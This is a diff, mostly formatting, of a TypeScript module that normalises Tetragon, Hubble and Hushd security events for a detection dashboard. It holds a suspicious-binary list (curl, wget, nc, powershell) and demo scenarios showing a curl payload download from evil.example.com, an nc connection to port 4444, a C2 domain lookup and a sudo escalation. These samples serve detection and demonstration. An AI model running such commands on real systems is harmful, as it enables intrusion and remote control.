@@ -13,9 +13,9 @@ import type {
   SDREvent,
   SDREventCategory,
   SDREventSource,
-  SDRSeverity,
   SDRMitreMapping,
   SDRNetworkInfo,
+  SDRSeverity,
   SpineConnectionStatus,
 } from "@/types/spine";
 import { isTauri } from "./tauri";
@@ -113,9 +113,11 @@ export class SpineEventSource {
 
     // Best-effort: tell Rust to stop subscribing
     if (isTauri()) {
-      import("@tauri-apps/api/core").then(({ invoke }) => {
-        invoke("unsubscribe_spine_events").catch(() => {});
-      }).catch(() => {});
+      import("@tauri-apps/api/core")
+        .then(({ invoke }) => {
+          invoke("unsubscribe_spine_events").catch(() => {});
+        })
+        .catch(() => {});
     }
   }
 
@@ -164,7 +166,11 @@ export function normalizeSpinePayload(payload: Record<string, unknown>): SDREven
     }
 
     // Hubble DNS event (has dns_names or l7 layer with DNS type)
-    if (payload.source && payload.destination && (payload.dns_names || (payload.l7 as Record<string, unknown>)?.type === "DNS")) {
+    if (
+      payload.source &&
+      payload.destination &&
+      (payload.dns_names || (payload.l7 as Record<string, unknown>)?.type === "DNS")
+    ) {
       return normalizeHubbleDnsEvent(payload);
     }
 
@@ -195,7 +201,9 @@ export function normalizeSpinePayload(payload: Record<string, unknown>): SDREven
 }
 
 function normalizeTetragonEvent(payload: Record<string, unknown>): SDREvent {
-  const exec = (payload.process_exec ?? payload.process_kprobe ?? payload.process_exit) as Record<string, unknown> | undefined;
+  const exec = (payload.process_exec ?? payload.process_kprobe ?? payload.process_exit) as
+    | Record<string, unknown>
+    | undefined;
   const process = (exec?.process ?? payload.process) as Record<string, unknown> | undefined;
 
   const binary = String(process?.binary ?? "unknown");
@@ -204,7 +212,9 @@ function normalizeTetragonEvent(payload: Record<string, unknown>): SDREvent {
   const parentExecId = String((process?.parent as Record<string, unknown>)?.exec_id ?? "");
   const podField = process?.pod;
   const pod = String(
-    (podField && typeof podField === "object" ? (podField as Record<string, unknown>).name : podField) ?? "",
+    (podField && typeof podField === "object"
+      ? (podField as Record<string, unknown>).name
+      : podField) ?? "",
   );
   const namespace = String(process?.namespace ?? "");
   const uid = typeof process?.uid === "number" ? (process.uid as number) : undefined;
@@ -216,19 +226,41 @@ function normalizeTetragonEvent(payload: Record<string, unknown>): SDREvent {
   if (payload.process_kprobe) {
     const kprobe = payload.process_kprobe as Record<string, unknown>;
     const funcName = String(kprobe?.function_name ?? "");
-    if (funcName.includes("write") || funcName.includes("open") || funcName.includes("unlink") || funcName.includes("rename")) {
+    if (
+      funcName.includes("write") ||
+      funcName.includes("open") ||
+      funcName.includes("unlink") ||
+      funcName.includes("rename")
+    ) {
       category = "file_write";
-    } else if (funcName.includes("read") || funcName.includes("stat") || funcName.includes("access")) {
+    } else if (
+      funcName.includes("read") ||
+      funcName.includes("stat") ||
+      funcName.includes("access")
+    ) {
       category = "file_access";
-    } else if (funcName.includes("connect") || funcName.includes("sendmsg") || funcName.includes("bind") || funcName.includes("listen") || funcName.includes("accept")) {
+    } else if (
+      funcName.includes("connect") ||
+      funcName.includes("sendmsg") ||
+      funcName.includes("bind") ||
+      funcName.includes("listen") ||
+      funcName.includes("accept")
+    ) {
       category = "network_connect";
-    } else if (funcName.includes("setuid") || funcName.includes("setgid") || funcName.includes("capset")) {
+    } else if (
+      funcName.includes("setuid") ||
+      funcName.includes("setgid") ||
+      funcName.includes("capset")
+    ) {
       category = "privilege_escalation";
     }
   }
 
   // Detect privilege escalation from binary names
-  if (category === "process_exec" && (binary.includes("sudo") || binary.includes("su") || binary.includes("pkexec"))) {
+  if (
+    category === "process_exec" &&
+    (binary.includes("sudo") || binary.includes("su") || binary.includes("pkexec"))
+  ) {
     if (uid === 0) category = "privilege_escalation";
   }
 
@@ -243,7 +275,17 @@ function normalizeTetragonEvent(payload: Record<string, unknown>): SDREvent {
     severity,
     severityLabel,
     summary: `${category.replace(/_/g, " ")}: ${binary}${pod ? ` (${pod})` : ""}`,
-    origin: { execId, parentExecId, binary, args, pod, namespace, uid, containerId: containerId || undefined, node: node || undefined },
+    origin: {
+      execId,
+      parentExecId,
+      binary,
+      args,
+      pod,
+      namespace,
+      uid,
+      containerId: containerId || undefined,
+      node: node || undefined,
+    },
     mitre: mitre ?? undefined,
     raw: payload,
   };
@@ -363,8 +405,23 @@ function normalizeHushdEvent(payload: Record<string, unknown>): SDREvent {
 // Classification helpers
 // ---------------------------------------------------------------------------
 
-function classifyTetragonSeverity(binary: string, category: SDREventCategory): { severity: number; severityLabel: SDRSeverity } {
-  const suspiciousBinaries = ["curl", "wget", "nc", "ncat", "python", "perl", "ruby", "bash", "sh", "powershell", "cmd"];
+function classifyTetragonSeverity(
+  binary: string,
+  category: SDREventCategory,
+): { severity: number; severityLabel: SDRSeverity } {
+  const suspiciousBinaries = [
+    "curl",
+    "wget",
+    "nc",
+    "ncat",
+    "python",
+    "perl",
+    "ruby",
+    "bash",
+    "sh",
+    "powershell",
+    "cmd",
+  ];
   const isSuspicious = suspiciousBinaries.some((b) => binary.includes(b));
 
   let severity = 0.3;
@@ -389,23 +446,39 @@ function scoreSeverity(score: number): SDRSeverity {
 function mapTetragonToMitre(category: SDREventCategory, binary: string): SDRMitreMapping | null {
   if (category === "process_exec") {
     if (binary.includes("sh") || binary.includes("bash") || binary.includes("cmd")) {
-      return { techniqueId: "T1059", techniqueName: "Command and Scripting Interpreter", tactic: "execution" };
+      return {
+        techniqueId: "T1059",
+        techniqueName: "Command and Scripting Interpreter",
+        tactic: "execution",
+      };
     }
     if (binary.includes("python") || binary.includes("perl") || binary.includes("ruby")) {
       return { techniqueId: "T1059.006", techniqueName: "Python", tactic: "execution" };
     }
   }
   if (category === "file_access") {
-    return { techniqueId: "T1083", techniqueName: "File and Directory Discovery", tactic: "discovery" };
+    return {
+      techniqueId: "T1083",
+      techniqueName: "File and Directory Discovery",
+      tactic: "discovery",
+    };
   }
   if (category === "file_write") {
     return { techniqueId: "T1565", techniqueName: "Data Manipulation", tactic: "impact" };
   }
   if (category === "network_connect") {
-    return { techniqueId: "T1071", techniqueName: "Application Layer Protocol", tactic: "command-and-control" };
+    return {
+      techniqueId: "T1071",
+      techniqueName: "Application Layer Protocol",
+      tactic: "command-and-control",
+    };
   }
   if (category === "privilege_escalation") {
-    return { techniqueId: "T1548", techniqueName: "Abuse Elevation Control Mechanism", tactic: "privilege-escalation" };
+    return {
+      techniqueId: "T1548",
+      techniqueName: "Abuse Elevation Control Mechanism",
+      tactic: "privilege-escalation",
+    };
   }
   return null;
 }
@@ -467,8 +540,18 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severity: 0.85,
     severityLabel: "critical" as SDRSeverity,
     summary: "process_exec: /usr/bin/curl -o /tmp/payload.sh https://evil.example.com/shell",
-    origin: { binary: "/usr/bin/curl", args: ["-o", "/tmp/payload.sh", "https://evil.example.com/shell"], pod: "web-prod-01", namespace: "production", execId: `exec-${Date.now()}` },
-    mitre: { techniqueId: "T1105", techniqueName: "Ingress Tool Transfer", tactic: "command-and-control" },
+    origin: {
+      binary: "/usr/bin/curl",
+      args: ["-o", "/tmp/payload.sh", "https://evil.example.com/shell"],
+      pod: "web-prod-01",
+      namespace: "production",
+      execId: `exec-${Date.now()}`,
+    },
+    mitre: {
+      techniqueId: "T1105",
+      techniqueName: "Ingress Tool Transfer",
+      tactic: "command-and-control",
+    },
   }),
   // Tetragon file write
   () => ({
@@ -477,7 +560,12 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severity: 0.7,
     severityLabel: "high" as SDRSeverity,
     summary: "file_write: /etc/crontab modified by unknown process",
-    origin: { binary: "/usr/bin/crontab", pod: "api-prod-01", namespace: "production", execId: `exec-${Date.now()}` },
+    origin: {
+      binary: "/usr/bin/crontab",
+      pod: "api-prod-01",
+      namespace: "production",
+      execId: `exec-${Date.now()}`,
+    },
     mitre: { techniqueId: "T1053.003", techniqueName: "Cron", tactic: "persistence" },
   }),
   // Tetragon network connect
@@ -487,9 +575,23 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severity: 0.6,
     severityLabel: "high" as SDRSeverity,
     summary: "network_connect: outbound connection to 198.51.100.42:4444",
-    origin: { binary: "/usr/bin/nc", pod: "auth-prod-01", namespace: "production", execId: `exec-${Date.now()}` },
-    network: { dstIp: "198.51.100.42", dstPort: 4444, protocol: "tcp", direction: "egress" as const },
-    mitre: { techniqueId: "T1071.001", techniqueName: "Web Protocols", tactic: "command-and-control" },
+    origin: {
+      binary: "/usr/bin/nc",
+      pod: "auth-prod-01",
+      namespace: "production",
+      execId: `exec-${Date.now()}`,
+    },
+    network: {
+      dstIp: "198.51.100.42",
+      dstPort: 4444,
+      protocol: "tcp",
+      direction: "egress" as const,
+    },
+    mitre: {
+      techniqueId: "T1071.001",
+      techniqueName: "Web Protocols",
+      tactic: "command-and-control",
+    },
   }),
   // Hubble dropped flow
   () => ({
@@ -498,7 +600,16 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severity: 0.7,
     severityLabel: "high" as SDRSeverity,
     summary: "10.1.1.20:48832 -> 198.51.100.42:443 [dropped]",
-    network: { srcIp: "10.1.1.20", dstIp: "198.51.100.42", srcPort: 48832, dstPort: 443, protocol: "tcp", verdict: "dropped" as const, direction: "egress" as const, bytes: 0 },
+    network: {
+      srcIp: "10.1.1.20",
+      dstIp: "198.51.100.42",
+      srcPort: 48832,
+      dstPort: 443,
+      protocol: "tcp",
+      verdict: "dropped" as const,
+      direction: "egress" as const,
+      bytes: 0,
+    },
     origin: { pod: "auth-prod-01", namespace: "production" },
   }),
   // Hubble normal flow
@@ -508,7 +619,16 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severity: 0.1,
     severityLabel: "info" as SDRSeverity,
     summary: "10.1.1.10:35200 -> 10.1.2.10:5432 [forwarded]",
-    network: { srcIp: "10.1.1.10", dstIp: "10.1.2.10", srcPort: 35200, dstPort: 5432, protocol: "tcp", verdict: "forwarded" as const, direction: "egress" as const, bytes: 4096 },
+    network: {
+      srcIp: "10.1.1.10",
+      dstIp: "10.1.2.10",
+      srcPort: 35200,
+      dstPort: 5432,
+      protocol: "tcp",
+      verdict: "forwarded" as const,
+      direction: "egress" as const,
+      bytes: 4096,
+    },
     origin: { pod: "web-prod-01", namespace: "production" },
   }),
   // Hushd policy violation
@@ -528,7 +648,11 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severityLabel: "critical" as SDRSeverity,
     summary: "Secret detected in file write: AWS_SECRET_ACCESS_KEY pattern",
     origin: { binary: "agent-coder", pod: "agent-runner-02", namespace: "agents" },
-    mitre: { techniqueId: "T1552.001", techniqueName: "Credentials In Files", tactic: "credential-access" },
+    mitre: {
+      techniqueId: "T1552.001",
+      techniqueName: "Credentials In Files",
+      tactic: "credential-access",
+    },
   }),
   // DNS query
   () => ({
@@ -537,7 +661,12 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severity: 0.4,
     severityLabel: "medium" as SDRSeverity,
     summary: "DNS query: c2.evil-domain.example from auth-prod-01",
-    network: { dnsName: "c2.evil-domain.example", dstPort: 53, protocol: "udp", direction: "egress" as const },
+    network: {
+      dnsName: "c2.evil-domain.example",
+      dstPort: 53,
+      protocol: "udp",
+      direction: "egress" as const,
+    },
     origin: { pod: "auth-prod-01", namespace: "production" },
   }),
   // Privilege escalation
@@ -547,8 +676,19 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severity: 0.95,
     severityLabel: "critical" as SDRSeverity,
     summary: "privilege_escalation: setuid binary executed in container",
-    origin: { binary: "/usr/bin/sudo", args: ["su", "-"], pod: "web-prod-01", namespace: "production", execId: `exec-${Date.now()}`, uid: 0 },
-    mitre: { techniqueId: "T1548.003", techniqueName: "Sudo and Sudo Caching", tactic: "privilege-escalation" },
+    origin: {
+      binary: "/usr/bin/sudo",
+      args: ["su", "-"],
+      pod: "web-prod-01",
+      namespace: "production",
+      execId: `exec-${Date.now()}`,
+      uid: 0,
+    },
+    mitre: {
+      techniqueId: "T1548.003",
+      techniqueName: "Sudo and Sudo Caching",
+      tactic: "privilege-escalation",
+    },
   }),
   // Normal process exec (low severity)
   () => ({
@@ -557,7 +697,13 @@ const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
     severity: 0.15,
     severityLabel: "info" as SDRSeverity,
     summary: "process_exec: /usr/bin/ls -la /app/data",
-    origin: { binary: "/usr/bin/ls", args: ["-la", "/app/data"], pod: "api-prod-01", namespace: "production", execId: `exec-${Date.now()}` },
+    origin: {
+      binary: "/usr/bin/ls",
+      args: ["-la", "/app/data"],
+      pod: "api-prod-01",
+      namespace: "production",
+      execId: `exec-${Date.now()}`,
+    },
   }),
 ];
 
